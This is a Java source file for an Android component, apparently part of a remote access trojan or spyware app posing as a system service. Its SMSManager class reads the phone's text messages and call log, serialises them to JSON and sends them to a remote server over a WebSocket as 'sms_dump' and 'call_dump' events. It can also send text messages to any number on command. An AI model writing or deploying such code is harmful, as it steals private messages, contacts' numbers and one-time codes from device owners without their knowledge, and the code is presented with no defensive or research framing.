package com.xrc.system.features;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {
    private static final String TAG = Constants.TAG + ":SMS";
    private static SMSManager instance;
    private final Context ctx;

    private SMSManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized SMSManager get(Context ctx) {
        if (instance == null) instance = new SMSManager(ctx);
        return instance;
    }

    public void dumpAndSend(int limit) {
        new Thread(() -> {
            Cursor cursor = null;
            try {
                cursor = ctx.getContentResolver().query(
                        Uri.parse("content://sms/"),
                        new String[]{"address", "body", "date", "type"},
                        null, null, "date DESC LIMIT " + limit);
                if (cursor == null) return;
                JSONArray arr = new JSONArray();
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    obj.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    obj.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    obj.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    arr.put(obj);
                }
                JSONObject data = new JSONObject();
                data.put("sms", arr);
                XRCWebSocketClient.get(ctx).sendEvent("sms_dump", data);
            } catch (Exception e) {
                Log.e(TAG, "SMS dump failed", e);
            } finally {
                if (cursor != null) cursor.close();
            }
        }).start();
    }

    public void dumpCallsAndSend(int limit) {
        new Thread(() -> {
            Cursor cursor = null;
            try {
                cursor = ctx.getContentResolver().query(
                        Uri.parse("content://call_log/calls"),
                        new String[]{"number", "duration", "date", "type"},
                        null, null, "date DESC LIMIT " + limit);
                if (cursor == null) return;
                JSONArray arr = new JSONArray();
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("number", cursor.getString(cursor.getColumnIndexOrThrow("number")));
                    obj.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow("duration")));
                    obj.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    obj.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    arr.put(obj);
                }
                JSONObject data = new JSONObject();
                data.put("calls", arr);
                XRCWebSocketClient.get(ctx).sendEvent("call_dump", data);
            } catch (Exception e) {
                Log.e(TAG, "Call dump failed", e);
            } finally {
                if (cursor != null) cursor.close();
            }
        }).start();
    }

    public void sendSMS(String to, String body) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(to, null, body, null, null);
        } catch (Exception e) {
            Log.e(TAG, "Send SMS failed", e);
        }
    }
}
